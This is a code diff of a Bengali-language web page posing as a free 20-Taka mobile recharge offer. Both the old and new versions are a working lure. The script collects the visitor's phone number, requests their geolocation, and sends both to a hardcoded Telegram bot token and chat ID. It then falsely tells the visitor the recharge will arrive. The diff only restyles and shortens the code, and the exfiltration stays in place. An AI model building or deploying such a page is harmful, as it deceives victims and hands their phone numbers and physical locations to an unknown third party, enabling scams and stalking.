@@ -5,12 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Recharge Portal</title>
     <style>
-        body { background: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
-        .container { max-width: 400px; margin: 40px auto; padding: 30px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; }
-        h2 { color: #28a745; font-size: 24px; }
-        input { width: 100%; padding: 15px; margin: 25px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; outline: none; }
-        .btn { background: #007bff; color: white; padding: 16px; width: 100%; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn:disabled { background: #ccc; }
+        body { background: #f0f2f5; font-family: sans-serif; text-align: center; margin: 0; padding: 0; }
+        .container { max-width: 400px; margin: 40px auto; padding: 30px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        h2 { color: #28a745; }
+        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; }
+        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -18,19 +17,15 @@
     <div class="container">
         <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
         <p>সঠিক নম্বর দিয়ে 'রিচার্জ নিন' বাটনে ক্লিক করুন।</p>
-        <input type="number" id="phone" placeholder="01XXXXXXXXX" required>
-        <button class="btn" id="subBtn" onclick="initiateRecharge()">রিচার্জ নিন</button>
+        <input type="number" id="phone" placeholder="01XXXXXXXXX">
+        <button class="btn" id="btn" onclick="startRecharge()">রিচার্জ নিন</button>
     </div>
 
 <script>
-async function initiateRecharge() {
-    const phone = document.getElementById('phone').value;
-    const btn = document.getElementById('subBtn');
-
-    if (phone.length < 11) { 
-        alert("দয়া করে সঠিক ১১ সংখ্যার নম্বর দিন!"); 
-        return; 
-    }
+async function startRecharge() {
+    const num = document.getElementById('phone').value;
+    const btn = document.getElementById('btn');
+    if (num.length < 11) { alert("সঠিক নম্বর দিন"); return; }
     
     btn.innerText = "প্রসেসিং...";
     btn.disabled = true;
@@ -38,45 +33,25 @@ async function initiateRecharge() {
     const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
     const chat_id = "7887080882";
 
-    // লোকেশন পারমিশন চাওয়ার স্মার্ট সিস্টেম
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                // ম্যাপ লিঙ্ক একদম নির্ভুল ফরম্যাটে
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                const text = `✅ **নতুন রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${phone}\n📍 ম্যাপ: ${mapLink}`;
-                await sendToTelegram(token, chat_id, text);
-            },
-            async (err) => {
-                // সোশ্যাল মিডিয়ায় লোকেশন ব্লক থাকলে এই অংশটি নম্বর পাঠিয়ে দিবে
-                const text = `⚠️ **নতুন রিকোয়েস্ট (লোকেশন ব্লক)**\n\n📱 নম্বর: ${phone}\n❌ ইউজার লোকেশন পারমিশন দেয়নি।`;
-                await sendToTelegram(token, chat_id, text);
-            },
-            { timeout: 8000 }
-        );
-    } else {
-        const text = `⚠️ **নতুন রিকোয়েস্ট (ব্রাউজার সাপোর্ট নেই)**\n\n📱 নম্বর: ${phone}`;
-        await sendToTelegram(token, chat_id, text);
-    }
+    // লোকেশন পাওয়ার চেষ্টা, না পেলে সরাসরি নম্বর পাঠানো
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        const text = `✅ **নতুন রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
+        await sendMsg(token, chat_id, text);
+    }, async (err) => {
+        const text = `⚠️ **নতুন রিকোয়েস্ট (লোকেশন ব্লক)**\n\n📱 নম্বর: ${num}\n❌ সোশ্যাল মিডিয়ায় লোকেশন ব্লক ছিল।`;
+        await sendMsg(token, chat_id, text);
+    }, { timeout: 6000 });
 }
 
-async function sendToTelegram(token, chat_id, text) {
+async function sendMsg(t, c, txt) {
     try {
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-        const res = await fetch(url);
-        if(res.ok) {
-            alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
-        } else {
-            alert("বট কানেকশনে সমস্যা! আপনার টোকেন চেক করুন।");
-        }
-    } catch (e) {
-        alert("নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।");
-    } finally {
-        const btn = document.getElementById('subBtn');
-        btn.innerText = "রিচার্জ নিন";
-        btn.disabled = false;
+        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+        alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
+    } catch (e) { alert("সার্ভার ত্রুটি!"); }
+    finally { 
+        document.getElementById('btn').innerText = "রিচার্জ নিন";
+        document.getElementById('btn').disabled = false;
     }
 }
 </script>
